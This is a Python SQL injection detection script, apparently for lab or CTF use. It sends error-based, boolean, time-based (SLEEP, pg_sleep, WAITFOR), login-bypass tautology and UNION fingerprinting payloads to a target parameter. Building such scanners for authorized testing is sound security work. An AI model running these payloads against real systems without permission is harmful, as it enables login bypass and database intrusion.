#!/usr/bin/env python3
# For authorized testing in lab/CTF environments only
"""SQL injection detection agent using requests for manual technique-based testing."""

import argparse
import json
import logging
import sys
import time
import re
from copy import deepcopy
from typing import Optional
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

try:
    import requests
except ImportError:
    sys.exit("requests is required: pip install requests")

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

SQL_ERRORS = {
    "mysql": [r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException"],
    "postgresql": [r"ERROR:\s+syntax error", r"pg_query\(\)", r"PSQLException"],
    "mssql": [r"SQL Server.*Driver", r"OLE DB.*SQL Server", r"SQLServerException"],
    "oracle": [r"ORA-\d{5}", r"Oracle.*Driver", r"quoted string not properly terminated"],
    "sqlite": [r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite"],
}


def detect_error_based(url: str, param: str, method: str = "GET",
                        headers: Optional[dict] = None, body: object = None,
                        location: str = "query") -> dict:
    """Inject a single quote to detect SQL errors in the response."""
    payload = "'"
    test_url, data = _build_request(url, param, payload, body, location)
    resp = _send(test_url, method, data, headers)

    db_type = None
    error_found = False
    for db, patterns in SQL_ERRORS.items():
        for pattern in patterns:
            if re.search(pattern, resp.text, re.IGNORECASE):
                db_type = db
                error_found = True
                break
        if error_found:
            break

    return {
        "technique": "error_based",
        "parameter": param,
        "injectable": error_found,
        "database": db_type,
        "status_code": resp.status_code,
    }


def detect_boolean_based(url: str, param: str, method: str = "GET",
                          headers: Optional[dict] = None, body: object = None,
                          location: str = "query") -> dict:
    """Test boolean-based blind SQLi with true/false conditions."""
    baseline_resp = _send_payload(
        url, param, "1", method, headers, body, location
    )
    true_resp = _send_payload(
        url, param, "1 AND 1=1--", method, headers, body, location
    )
    false_resp = _send_payload(
        url, param, "1 AND 1=2--", method, headers, body, location
    )

    true_match = len(true_resp.content) == len(baseline_resp.content)
    false_diff = abs(len(false_resp.content) - len(baseline_resp.content)) > 10

    login_or_bypass = {
        "technique": "login_or_boolean",
        "injectable": False,
    }
    if param.casefold() == "email" and urlsplit(url).path.rstrip("/").casefold().endswith(
        "/login"
    ):
        login_body = deepcopy(body) if isinstance(body, dict) else body
        if isinstance(login_body, dict) and "password" in login_body:
            login_body["password"] = "sqli-agent-invalid-password"

        or_true_resp = _send_payload(
            url,
            param,
            "' OR 1=1--",
            method,
            headers,
            login_body,
            location,
        )
        or_false_resp = _send_payload(
            url,
            param,
            "' OR 1=2--",
            method,
            headers,
            login_body,
            location,
        )
        login_or_bypass.update(
            {
                "injectable": (
                    200 <= or_true_resp.status_code < 300
                    and or_false_resp.status_code >= 400
                ),
                "true_status_code": or_true_resp.status_code,
                "false_status_code": or_false_resp.status_code,
                "true_response_length": len(or_true_resp.content),
                "false_response_length": len(or_false_resp.content),
            }
        )

    return {
        "technique": "boolean_based",
        "parameter": param,
        "injectable": (true_match and false_diff) or login_or_bypass["injectable"],
        "baseline_length": len(baseline_resp.content),
        "true_length": len(true_resp.content),
        "false_length": len(false_resp.content),
        "login_or_bypass": login_or_bypass,
    }


def detect_time_based(url: str, param: str, method: str = "GET",
                      headers: Optional[dict] = None, delay: int = 2,
                       body: object = None, location: str = "query") -> dict:
    """Test time-based blind SQLi with sleep functions."""
    payloads = {
        "mysql": f"1 AND SLEEP({delay})--",
        "postgresql": f"1; SELECT pg_sleep({delay})--",
        "mssql": f"1; WAITFOR DELAY '0:0:{delay}'--",
    }
    baseline_started = time.perf_counter()
    _send_payload(url, param, "1", method, headers, body, location)
    baseline_elapsed = time.perf_counter() - baseline_started
    results = {}
    for db, payload in payloads.items():
        start = time.perf_counter()
        response = _send_payload(url, param, payload, method, headers, body, location)
        elapsed = time.perf_counter() - start
        results[db] = {
            "elapsed": round(elapsed, 2),
            "delayed": (
                response.status_code < 400
                and elapsed >= baseline_elapsed + delay - 0.5
            ),
        }

    injectable = any(r["delayed"] for r in results.values())
    detected_db = next((db for db, r in results.items() if r["delayed"]), None)

    return {
        "technique": "time_based",
        "parameter": param,
        "injectable": injectable,
        "database": detected_db,
        "delay_target": delay,
        "timing_results": results,
    }


def detect_union_columns(url: str, param: str, method: str = "GET",
                          headers: Optional[dict] = None, max_cols: int = 20) -> dict:
    """Determine the number of columns for UNION-based injection."""
    for n in range(1, max_cols + 1):
        payload = f"1 ORDER BY {n}--"
        resp = _send_payload(url, param, payload, method, headers)
        if resp.status_code >= 400 or "error" in resp.text.lower():
            return {"technique": "union_column_count", "parameter": param, "columns": n - 1}

    return {"technique": "union_column_count", "parameter": param, "columns": None}


def fingerprint_database(url: str, param: str, method: str = "GET",
                          headers: Optional[dict] = None) -> dict:
    """Identify the database engine using version functions."""
    version_payloads = {
        "mysql": "1 UNION SELECT @@version,NULL--",
        "postgresql": "1 UNION SELECT version(),NULL--",
        "mssql": "1 UNION SELECT @@version,NULL--",
    }
    for db, payload in version_payloads.items():
        resp = _send_payload(url, param, payload, method, headers)
        if resp.status_code == 200 and len(resp.content) > 50:
            return {"database": db, "response_preview": resp.text[:200]}

    return {"database": "unknown"}


def _build_request(url: str,param: str,value: str,body: object = None,location: str = "query",):
    if location == "query":
        parts = urlsplit(url)
        query = parse_qsl(parts.query, keep_blank_values=True)
        replaced = False
        updated_query = []
        for name, current_value in query:
            if name == param and not replaced:
                updated_query.append((name, value))
                replaced = True
            else:
                updated_query.append((name, current_value))
        if not replaced:
            updated_query.append((param, value))
        return urlunsplit(
            (parts.scheme, parts.netloc, parts.path, urlencode(updated_query), parts.fragment)
        ), None

    if location == "json_body":
        if isinstance(body, str):
            body = json.loads(body)
        data = deepcopy(body) if isinstance(body, dict) else {}
        path = param.split(".")
        current = data
        for segment in path[:-1]:
            child = current.get(segment)
            if not isinstance(child, dict):
                child = {}
                current[segment] = child
            current = child
        current[path[-1]] = value
        return url, data

    if isinstance(body, str):
        data = dict(parse_qsl(body, keep_blank_values=True))
    elif isinstance(body, dict):
        data = deepcopy(body)
    else:
        data = {}
    data[param] = value
    return url, data


def _send_payload(
    url: str,
    param: str,
    value: str,
    method: str,
    headers: Optional[dict] = None,
    body: object = None,
    location: str = "query",
) -> requests.Response:
    request_url, data = _build_request(url, param, value, body, location)
    return _send(request_url, method, data, headers)


def _send(url: str, method: str = "GET", data: Optional[dict] = None,
           headers: Optional[dict] = None) -> requests.Response:
    h = {
        name: value
        for name, value in (headers or {}).items()
        if name.lower() not in {"host", "content-length", "connection", "transfer-encoding"}
    }
    if method.upper() == "POST":
        if any(
            name.lower() == "content-type" and "json" in str(value).lower()
            for name, value in h.items()
        ):
            return requests.post(url, json=data, headers=h, timeout=15)
        return requests.post(url, data=data, headers=h, timeout=15)
    return requests.get(url, headers=h, timeout=15)


def run_detection_assessment(
    url: str,
    param: str,
    method: str = "GET",
    headers: Optional[dict] = None,
    body: object = None,
    location: str = "query",
) -> dict:
    """Run bounded error, boolean, and timing checks without extraction."""
    error = detect_error_based(url, param, method, headers, body, location)
    boolean = detect_boolean_based(url, param, method, headers, body, location)
    timing = detect_time_based(url, param, method, headers, 2, body, location)
    injectable = error["injectable"] or boolean["injectable"] or timing["injectable"]
    findings = []
    if error["injectable"]:
        findings.append(f"Error-based SQLi evidence (database: {error['database']})")
    if boolean["injectable"]:
        login_test = boolean.get("login_or_bypass", {})
        if login_test.get("injectable"):
            findings.append(
                "Boolean login bypass: tautology accepted and contradiction rejected"
            )
        else:
            findings.append("Boolean-based SQLi evidence")
    if timing["injectable"]:
        findings.append(f"Time-based SQLi evidence (database: {timing['database']})")

    return {
        "target": url,
        "parameter": param,
        "location": location,
        "injectable": injectable,
        "error_based": error,
        "boolean_based": boolean,
        "time_based": timing,
        "findings": findings,
    }


def run_assessment(url: str, param: str, method: str = "GET") -> dict:
    """Run complete SQL injection assessment."""
    report = run_detection_assessment(url, param, method)
    error = report["error_based"]
    columns = detect_union_columns(url, param, method) if error["injectable"] else {}
    return {**report, "union_columns": columns}


def main():
    parser = argparse.ArgumentParser(description="SQL Injection Detection Agent")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param", required=True, help="Parameter to test")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--output", default="sqli_report.json")
    args = parser.parse_args()

    report = run_assessment(args.url, args.param, args.method)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
